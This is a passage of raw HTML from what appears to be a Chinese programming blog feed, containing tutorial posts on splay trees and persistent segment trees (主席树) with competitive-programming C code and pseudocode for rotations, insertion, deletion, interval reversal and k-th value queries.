</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> f = fa[x];</span><br><span class="line">    <span class="keyword">while</span> (f) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fa[f]) rotate(get(x) == get(f) ? f : x);</span><br><span class="line">        rotate(x);</span><br><span class="line">        f = fa[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意要把根节点换了</span></span><br><span class="line">    rt = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　事实上，如果我们把0想象成根节点的父亲的话，我们发现，这个操作事实上就是把某个节点旋转到0的儿子。这样的话，我们可以对这个函数进行一点点简单的修改，使splay操作不仅可以把某一个点旋转到根节点，还可以旋转到某个特定节点的儿子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个时候k就是我们想要旋转到的某个节点，想旋转到根节点时，调用splay(x,0)即可</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">splay</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> f = fa[x];</span><br><span class="line">    <span class="keyword">while</span> (f != k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fa[f] != k) rotate(get(x) == get(f) ? f : x);</span><br><span class="line">        rotate(x);</span><br><span class="line">        f = fa[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!k) rt = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="insert-amp-remove-2"><a href="#insert-amp-remove-2" class="headerlink" title="insert &amp; remove"></a>insert &amp; remove</h3><p>　　splay的插入操作遵循BST的规则，即如果要插入的值小于当前节点，则向左儿子走，如果大于当前节点，则向右儿子走，如果相等，并且是可重复的话，当前节点的累计数量+1。伪代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> rt, tot; <span class="comment">// rt为根节点对应的编号, tot表示当前使用的最大的节点的编号</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!rt) &#123;</span><br><span class="line">    <span class="comment">// 开辟一个新节点</span></span><br><span class="line">    rt = ++tot;</span><br><span class="line">    size[rt] = <span class="number">1</span>;</span><br><span class="line">    val[rt] = v;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> cur = rt, f = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (val[cur] == v) &#123;</span><br><span class="line">      cnt[cur]++;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    f = cur;</span><br><span class="line">    cur = ch[cur][val[cur] &lt; v];</span><br><span class="line">    <span class="keyword">if</span> (!cur) &#123;</span><br><span class="line">      <span class="comment">// 开辟新的节点</span></span><br><span class="line">      cur = ++tot;</span><br><span class="line">      fa[cur] = f;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　删除操作事实上是很类似的，但是更加复杂一点。在删除之前，首先我们要把要删除的节点使用splay操作移动到根节点，如果是给一个值v，然后删除的话，我们需要先得到值v对应的节点的编号x，然后调用splay(x)移动到根节点。并且，移动到根节点后，还要分情况考虑：<br>　　如果x没有儿子，直接删除即可。<br>　　如果x有一个儿子，则将当前节点删除，并把唯一的儿子作为根节点。<br>　　如果x有两个儿子，则需要获取当前节点的前驱(比当前节点小的值当中最大的那个)。然后将该前驱用splay操作移动到根节点，并且直接删除节点x,并将x的右子树作为根节点的右子树即可。(这里可以这样做的原因是这个时候<strong>x的左子树必定为空，这是BST的性质</strong>)<br>　　并且，还要注意删除的时候记得更新节点，并且需要的话根节点也应该更改。<br>　　伪代码如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  remove_to_root(x);</span><br><span class="line">  <span class="comment">// 节点覆盖次数大于1时，直接减去</span></span><br><span class="line">  <span class="keyword">if</span> (cnt[rt] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      cnt[rt]--;</span><br><span class="line">      sz[rt]--;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ch[rt][<span class="number">0</span>] &amp;&amp; !ch[rt][<span class="number">1</span>])</span><br><span class="line">      <span class="keyword">delete</span>(rt);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!ch[rt][<span class="number">0</span>])</span><br><span class="line">      delete_leftson(rt);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!ch[rt][<span class="number">1</span>])</span><br><span class="line">      delete_rightson(rt);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">int</span> p = pre(), cur = rt;</span><br><span class="line">      splay(p);</span><br><span class="line">      fa[ch[cur][<span class="number">1</span>]] = p;</span><br><span class="line">      ch[p][<span class="number">1</span>] = ch[cur][<span class="number">1</span>];</span><br><span class="line">      clear(cur);</span><br><span class="line">      up(rt);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="maintain-an-interval-1"><a href="#maintain-an-interval-1" class="headerlink" title="maintain an interval"></a>maintain an interval</h3><p>　　同样的，由于splay的特性，它也很适合被用来维护某一个区间。注意到这个时候，splay中节点的组织形式应该是依据<strong>下标</strong>的！因此，这个时候splay不一定满足每个节点的val比左儿子大，比右儿子小，它满足的是每个节点的左儿子在数组中的下标一定比该节点小，而右儿子对应的下标一定比该节点的大。这里的想法其实和无旋treap某种程度上是一致的。这里以<a href="https://www.luogu.org/problemnew/show/P3391" target="_blank" rel="noopener">文艺平衡树</a>为例子简单提一下区间的处理方法。<br>　　题目的大意如下：</p><blockquote><p>给一个包含n个数的区间，以及m个操作，每一个操作包含两个整数l,r。要求将区间[l,r]翻转过来。输出最后区间上每个数的值</p></blockquote><p>　　题目就只有一个区间操作，即翻转。这里，我们同样可以借用之前线段树lazy_tag的思想。当前区间需要翻转时，我们为该节点打上一个标记，并且交换左右儿子即可。当遇到翻转标记时，我们就下传即可。这里的另一个问题是，我们要怎样获得需要的区间呢？和线段树一样吗？和之前的无旋treap一样吗？<br>　　考虑下前面我们是怎么获得一段区间的。无旋treap采用的是分裂与合并的思想。直接将需要的区间分裂出来，并打上标记即可。而splay并没有分裂操作，但是由于伸展树的特殊性，我们可以采用两次splay操作获得对应的区间。核心代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设操作的区间是[l,r]</span></span><br><span class="line"><span class="keyword">int</span> s1 = find(l<span class="number">-1</span>);  <span class="comment">// 获得数组中第l-1个元素对应在树上的编号</span></span><br><span class="line">splay(s1, <span class="number">0</span>);       <span class="comment">// 将s1旋转到根节点</span></span><br><span class="line"><span class="keyword">int</span> s2 = find(r+<span class="number">1</span>);  <span class="comment">// 获得r+1对应的编号</span></span><br><span class="line">splay(s2, s1);      <span class="comment">// 将s2旋转到s1的儿子(这个时候s2必定为s1的右儿子，且s2左儿子为空)</span></span><br><span class="line"><span class="keyword">int</span> x = ch[s2][<span class="number">0</span>]; <span class="comment">// 得到对应的区间的编号</span></span><br><span class="line">rev[x] = !rev[x]; <span class="comment">// 更新标记</span></span><br><span class="line">swap(ch[x][<span class="number">0</span>], ch[x][<span class="number">1</span>]); <span class="comment">// 交换左右儿子</span></span><br></pre></td></tr></table></figure></p><p>　　注意一下边界情况的处理。(其实可以在原先的树中插入两个节点作为左右边界，这样l-1和r+1就不会溢出了。</p><h3 id="summary-of-splay"><a href="#summary-of-splay" class="headerlink" title="summary of splay"></a>summary of splay</h3><p>　　这里就简单地对splay做一下总结吧。伸展树作为BST的另一个变种，它的特性比较”神奇”，采用splay操作会使得整颗树需要经常地做调整，就像在”伸展”一样。在时间复杂度上，插入，删除等操作均为O(logn)。当然，需要注意的是，这个复杂度是一个均摊复杂度。和treap类似，splay并不能算严格意义上的”平衡”。在某些情况下，它依然会退化成链表，当然，由于splay操作的存在，即使退化了，它也能比较快地调整回来，因此平均下来，最后的复杂度仍然能够做到O(logn)。当然，splay本身写起来并不算很好写(比起treap的话)，不过在实际中应用还是挺广泛的。</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>　　数据结构大杂烩系列的第三篇文章到这里就告一段落了。在这篇文章中，我们讲了两种平衡树，treap和splay，这两种平衡树各有特点，并且在时间和空间复杂度上还是十分优秀的。另外，本身平衡树这个知识点就比较难，还是强烈建议去做几道题，这样才能真正地掌握平衡树的核心思想。这里还是推荐<a href="https://www.lydsy.com/JudgeOnline/problem.php?id=1500" target="_blank" rel="noopener">NOI2005维修数列</a>这道题，难度稍微有点大，但质量很好。网上的题解有很多，不过质量参差不齐。<del>如果需要的话可以到我的github上找，但没打注释</del><br>　　接下来的话，第四篇文章可能打算写一下关于红黑树的内容，敬请期待吧</p>]]></content>
      
      
      <categories>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure </tag>
            
            <tag> Balanced Tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Data Structure Note(II) —— Persistent Segment Tree</title>
      <link href="/2019/05/25/data-structure2/"/>
      <url>/2019/05/25/data-structure2/</url>
      
        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这是数据结构大杂烩系列的第二篇文章。在前一篇文章中，我们学习了线段树及一些相关的数据结构。我们简单地了解了线段树是如何构造，如何维护的，并简单地了解了它的应用。今天，就让我们一起再深入学习它吧。<br>　　今天的主题是可持久化线段树，这是一种能存储区间“历史变化”的数据结构，本身代码量不大，但理解起来还是有一定难度的。<br>　　注：本文假设读者对线段树已经有了一定的了解。如果不知道线段树是什么，请先前往<a href="https://littlecsd.net/2019/05/14/data-structure1/#more" target="_blank" rel="noopener">Data Structure Note(I)</a></p><h2 id="a-simple-problem"><a href="#a-simple-problem" class="headerlink" title="a simple problem"></a>a simple problem</h2><p>　　国际惯例，在深入学习相关概念之前，我们先来了解一下这样一种问题。我们知道，线段树能维护区间的最大值最小值，可如果我们要的是区间的第K大值呢？</p><blockquote><p>给定一个数组n，然后有m个询问，每个询问包含三个值L，R，K，要求输出在[L，R]区间上的第K大值(K &lt;= R - L + 1)</p></blockquote><p>　　同样的，最直接的做法就是直接扫描区间[L，R]，拿出所有元素并从大到小排序，最后输出第K个值即可。当然，很明显这样的做法是不可取的——复杂度高达O(mnlogn)，我们发现，在这样一种情况下，我们对元素进行排序实际上做了很多“无用”的操作，我们仅仅需要第K大的值，但排序却得到了所有数字的大小顺序，显然有些冗余。那么有没有什么好的办法呢？有的，就是可持久化线段树(下称主席树)</p><h2 id="before-we-learn"><a href="#before-we-learn" class="headerlink" title="before we learn"></a>before we learn</h2><h3 id="weighted-segment-tree"><a href="#weighted-segment-tree" class="headerlink" title="weighted segment tree"></a>weighted segment tree</h3><p>　　在正式进入主席树之前，我们需要先理解好权值线段树这一概念。本身权值线段树也是一种线段树，和我们在上一篇文章中提到的线段树的主要区别在于，权值线段树中叶子节点的概念不太一样。比如下面的一个数组a[]=[3,2,1,5,5,7,8]。按照之前的线段树的概念，这个时候线段树是根据下标建立的。因此，线段树一共有七个叶子节点，其中每个节点的值分别为3,2,1,5,5,7,8<br>　　那么对于权值线段树呢？由于这是按照值建立的树，通常情况下，这颗树应该有八个叶子节点(数组a中的数字的值域为[1,8])。并且，每个叶子节点中的值表示的应该是某个权值出现的次数。如果还不太理解的话可以看下图。<br><img src="/2019/05/25/data-structure2/difference.jpg" alt="weighted"></p><p>　　为什么要提到权值线段树呢？答案还是在图中。结合之前我们学习的关于线段树相关的知识。我们发现，权值线段树天生就可以被用来查找区间的第K大值，并且还是在logn的复杂度下。下面为伪代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> rt, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (l == r) <span class="keyword">return</span> l</span><br><span class="line">  <span class="comment">// 当左儿子的权值w&lt;=k时，说明左儿子至少有k个数，第k大的一定在左儿子</span></span><br><span class="line">  <span class="comment">// 否则第k大的数一定在右儿子，且是右儿子中第k-w大的数</span></span><br><span class="line">  <span class="keyword">if</span> (左儿子权值不大于k) search(lson(rt), l, mid, k)</span><br><span class="line">  <span class="keyword">else</span> search(rson(rt), mid+<span class="number">1</span>, r, k - weight(lson(rt)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　这样，我们就发现，如果对整个数组建立一颗权值线段树的话，我们可以在logn复杂度的前提下，得到整个数组中第k大的数字，我们成功地向答案迈进了第一步!<br>　　再考虑一下，如果我们只是对部分数组建立权值线段树呢？比如，将区间[1,x]的所有数字放在一起，建立一颗权值线段树，按照上面的逻辑，我们就可以获得区间[1,x]中任意第k大的数字了。<br>　　再前进一步，如果我们能够对区间[l,r]建立一颗权值线段树，那么我们是不是就可以得到区间的第k大的数字了呢？恩，这个就是主席树基本原理之一。</p><h3 id="weighted-segment-tree’s-operations"><a href="#weighted-segment-tree’s-operations" class="headerlink" title="weighted segment tree’s operations"></a>weighted segment tree’s operations</h3><p>　　前面我们说，如果能对所有的区间建立线段树的话，我们就可以顺利地解决区间的第k大问题了，但是这样的复杂度未免也太高了。区间总数为O(n^2)，建树的复杂度是O(nlogn)，合起来的复杂度高达O(n^3 logn)，当然，即使时间上能接受，空间上也接受不了。因此，我们必须想办法减少开销。一个可行的办法是，利用<b>权值线段树可以做减法</b>的特点。这是什么意思呢？比如我们现在得到了在区间[1,x]和区间[1,y]上建立的两颗权值线段树(y&gt;x)，这个时候这两颗树之间所有对应的节点之间做减法，我们就可以得到在区间[x+1,y]上建立的权值线段树。如果不能理解，可以参考下图。(这里建议自己画图理解理解，这是解决主席树问题的关键一步)<br><img src="/2019/05/25/data-structure2/weighted.jpg" alt="weighted"></p><h3 id="make-full-use-of-last-tree"><a href="#make-full-use-of-last-tree" class="headerlink" title="make full use of last tree"></a>make full use of last tree</h3><p>　　前面我们得到了这样一个结论：两颗权值线段树[1,x],[1,y]之间做减法，可以直接得到第三颗权值线段树[x+1,y]。因此，我们只需要建立O(n)颗线段树就好了。这样，我们就再次降低了复杂度。但是，我们又发现了另一个问题，对于以区间[1,x]和[1,x+1]建立的两颗线段树来说，其实发生变化的最多只有logn个节点(想想为什么)，因此，它们之前很多信息是重复的，如果我们能够重复利用这段信息的话，那样也许就能降低复杂度了。<br>　　如果要利用前一颗线段树的信息，最直接的办法就是直接复用前一颗线段树的节点，对于当前的节点，如果左儿子的信息需要更新，那么我们就重新开一个点，将当前节点的左儿子连接到新开的点，并赋予新值，将当前节点的右儿子连接到前一颗线段树对应的节点即可。<br>　　这个思想很简单，但却是主席树的精华所在。同样的，如果不是很理解，可以参考下图。当然，这里还是同样建议自己试着画图，更有助于理解。<br><img src="/2019/05/25/data-structure2/build.JPG" alt="build_tree"></p><h2 id="persistent-segment-tree"><a href="#persistent-segment-tree" class="headerlink" title="persistent segment tree"></a>persistent segment tree</h2><p>　　现在，我们终于可以正式进入主席树了。其实，大部分要讲的东西已经讲完了。这里还是贴一下代码吧，结合代码理解起来会更方便一些。这里以<a href="http://poj.org/problem?id=2104" target="_blank" rel="noopener">POJ2104</a>为例子，简单地提一下主席树的写法。</p><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><p>　　在建树的时候，要注意一个问题，对主席树而言，建树的空间复杂度为O(nlogn)，因此，建议在申请空间时，直接开一个(N&lt;&lt;5)大小的数组，避免空间不够导致的错误。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100111</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN (N&lt;&lt;5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mid(l,r) ((l+r)&gt;&gt;1)</span></span><br><span class="line"><span class="keyword">int</span> a[N], b[N]; <span class="comment">// a, b数组用于读入数据，与题目有关</span></span><br><span class="line"><span class="keyword">int</span> tot = <span class="number">0</span>; <span class="comment">// 动态开点，注意，不建议使用malloc，效率过低</span></span><br><span class="line"><span class="keyword">int</span> rt[N], lson[MAXN], rson[MAXN], sum[MAXN];</span><br><span class="line"><span class="comment">// rt[i]表示建立的第i颗树的树根index</span></span><br><span class="line"><span class="comment">// lson[i]和rson[i]分别表示index为i的节点的左右儿子的index，注意到不能用i&lt;&lt;1和i&lt;&lt;1|1表示左右儿子了</span></span><br><span class="line"><span class="comment">// sum[i] 表示当前节点所对应的区间的值的出现次数</span></span><br><span class="line"><span class="comment">// main函数中使用build(rt[0], 1, n)进行建树即可</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span>&amp; x, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    x = ++tot;</span><br><span class="line">    sum[x] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = mid(l,r);</span><br><span class="line">    build(lson[x], l, mid);</span><br><span class="line">    build(rson[x], mid+<span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>　　更新的操作其实和线段树基本一样。但每一个节点都是动态开启的。记得将当前树和上一颗树关联起来即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 具体建树的时候，扫描一整个数组，对于每一个值(注意不是下标)，</span></span><br><span class="line"><span class="comment">// 调用update(rt[x], rt[x-1], 1, n, a[x])即可</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span>&amp; x, <span class="keyword">int</span> lrt, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">    x = ++tot;</span><br><span class="line">    sum[x] = sum[lrt] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span>;</span><br><span class="line">    lson[x] = lson[lrt]; <span class="comment">// 此处将当前节点与上一颗树的左儿子连接在一起</span></span><br><span class="line">    rson[x] = rson[lrt]; <span class="comment">// 右儿子同样</span></span><br><span class="line">    <span class="keyword">int</span> mid = mid(l,r);</span><br><span class="line">    <span class="comment">// 如果需要更新的在左儿子，将左儿子传入，注意到lson[x]的值在下一层迭代中会被覆盖，即开启了新的节点，右儿子同理</span></span><br><span class="line">    <span class="keyword">if</span> (pos &lt;= mid) update(lson[x], lson[lrt], l, mid, pos);</span><br><span class="line">    <span class="keyword">else</span> update(rson[x], rson[lrt], mid+<span class="number">1</span>, r, pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询区间[L,R]时，调用query(rt[R],rt[L-1],1,n,k)即可</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">int</span> mid = mid(l,r);</span><br><span class="line">    <span class="keyword">int</span> cnt = sum[lson[R]] - sum[lson[L]]; <span class="comment">// 利用权值线段树可减的特性，得到对应区间左儿子的权值</span></span><br><span class="line">    <span class="keyword">if</span> (k &lt;= cnt) <span class="keyword">return</span> query(lson[L], lson[R], l, mid, k);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> query(rson[L], rson[R], mid+<span class="number">1</span>, r, k - cnt); <span class="comment">// 记得减去左儿子权值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="something-else"><a href="#something-else" class="headerlink" title="something else"></a>something else</h3><p>　　在处理实际问题的时候，我们还需要注意一个问题。建立权值线段树的时候，通常权值的范围可能在-2^31~2^31-1之间，对于这样大的一个范围，显然我们是不可能建立线段树的，因此比较合理的做法应该是使用在上一篇文章中提到的离散化，将权值映射到区间[1,n]上，并进行去重操作，这样复杂度就变得很合理了。在C++中，可以这样写：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sort(b+<span class="number">1</span>, b+n+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> m = unique(b+<span class="number">1</span>, b+n+<span class="number">1</span>) - (b+<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>　　其中，sort用于对数组进行排序，unique用于去重，返回的是尾指针。<br>　　另外，如果理解了主席树的思想的话，我们会发现，一开始我们使用build函数的时候，建立的树rt[0]事实上是空的，因此build函数是可以不用的，直接for循环并且动态地添加每一个点即可。</p><p>　　总的来说，主席树在建立新的树的时候，用的是动态开点，每一次更新操作，时间和空间复杂度均为O(logn)。建树总时间和空间复杂度均为O(nlogn)，对于询问的总复杂度为O(mlogn)，这样就都降低到可以接受的范围内了。并且，主席树最核心的思想在于它<b>充分利用了前一颗树的信息</b>，大幅度降低了复杂度。现在，我们能够成功地解决在文章一开始的时候提出的问题了。(建议做一道模板题以加深理解。</p><h2 id="level-up-count-on-a-tree"><a href="#level-up-count-on-a-tree" class="headerlink" title="level up - count on a tree"></a>level up - count on a tree</h2><p>　　之前，我们利用主席树解决了区间的第k大的问题，现在，我们题目的难度升级了，如果是要求在树上的第k大值呢？恩，还是用主席树，那么这个时候又该怎么处理呢？之前我们能够求出区间上的第k大的值，是因为区间是连续，而且是线性的，我们能够使用sum[R]-sum[L-1]得到区间[L,R]上的值，然而，如果是在一颗树上的话，它并不满足线性这一条件。那该怎么办呢？<br>　　一个可行解是对我们的答案进行差分。对于在树上的两个点u和v，他们之间有且仅有一条唯一的路径，这个时候，假设他们的最近公共祖先(lca)为t的话，那么u和v上的点的权值的和变成sum[u]+sum[v]-sum[t]-sum[fa[t]]。这里，fa[t]表示t的父亲节点，注意，这里同样用到了权值线段树可以进行减法的特性。并且，这里的sum[x]表示的应该是当前节点x到根节点的所有值建成的权值线段树。如果能理解好这一点的话，那么这个问题也就变得很简单了。<br>　　具体实现时，我们只需要在更新的时候，调用update(rt[x],rt[fa[x]],1,n,a[x])，即<b>使用当前节点的父亲节点去更新当前节点</b>，并且，query需要进行一定的更改，具体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用的时候为query(1,n,u,v,lca(u,v),fa[lca(u,v)],k)即可</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> lca, <span class="keyword">int</span> f_lca, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="comment">// 这里进行了差分的操作</span></span><br><span class="line">    <span class="keyword">int</span> s = sum[lson[u]] + sum[lson[v]] - sum[lson[lca]] - sum[lson[f_lca]];</span><br><span class="line">    <span class="keyword">int</span> mid = mid(l,r);</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= s) <span class="keyword">return</span> query(l, mid, lson[u], lson[v], lson[lca], lson[f_lca], k);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> query(mid+<span class="number">1</span>, r, rson[u], rson[v], rson[lca], rson[f_lca], k - s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="how-to-find-lca"><a href="#how-to-find-lca" class="headerlink" title="how to find lca"></a>how to find lca</h3><p>　　查询最近公共祖先的方法有很多(不知道这个算不算是数据结构的知识)。其中一种可行的解法就是采用倍增，在O(nlogn)的预处理后，能在O(logn)的复杂度下求得最近公共祖先。另外一种可行的解法是采用树链剖分，也是一种数据结构中的常用算法，这里就不进行赘述了。</p><h2 id="level-up-up"><a href="#level-up-up" class="headerlink" title="level up up!"></a>level up up!</h2><p>　　前面我们处理的都是静态的第k大值的问题，但是实际应用中我们往往会遇到很多动态的情况。比如操作中包含对某些点的更新，在这种情况下区间的第k大值的话，难度就很大了。前面我们处理区间第k大值的时候，是按照从左到右的顺序逐步插入点的，并且建的是权值线段树，这个时候如果我们要更改第x位的数字的话，那么后面rt[x+1]~rt[n]都要进行更改，这样的代价很明显是不可取的。那么我们就必须换一种思路。这里以<a href="https://www.luogu.org/problemnew/show/P2617" target="_blank" rel="noopener">洛谷P2617</a>为例</p><blockquote><p>给一个长度为n的序列，以及m个操作，包含两种类型，一种是求[l,r]区间上的第k大值，另一种是修改当前数组中某个元素的值。</p></blockquote><p>　　对这道题来说，我们要实现的是单点修改和区间查询两种操作。要满足修改操作的话，那么我们又必须对后面的所有数，即区间进行更新。那么我们能不能减少更新的数量呢？仅仅更新一部分主席树即可。像上一篇文章中求前缀和的问题一样，用一个sum数组累计前缀和的话，遇上有单点修改操作的时候，sum数组后面所有数字都要进行修改。当时我们用的是线段树和树状数组解决的。那么对于这个问题，是不是可以采用类似的思路呢？<br>　　结合这道题而言，我们选择采用了树状数组来实现。(理论上也是可以用线段树实现的，但是线段树的复杂度在常数上略输一筹)。注意到，这个时候，<b>每一颗主席树中每一个点代表的是一段前缀和</b>，并且，在更新的时候，<b>只能用自身的信息来更新自身</b>，否则会破坏树状数组的结构。<br>　　并且，由于这道题中有单点修改操作，因此在建树的时候我们必须先进行离线操作，将修改的值也放进数组当中并进行离散化处理。<br>　　几个核心函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 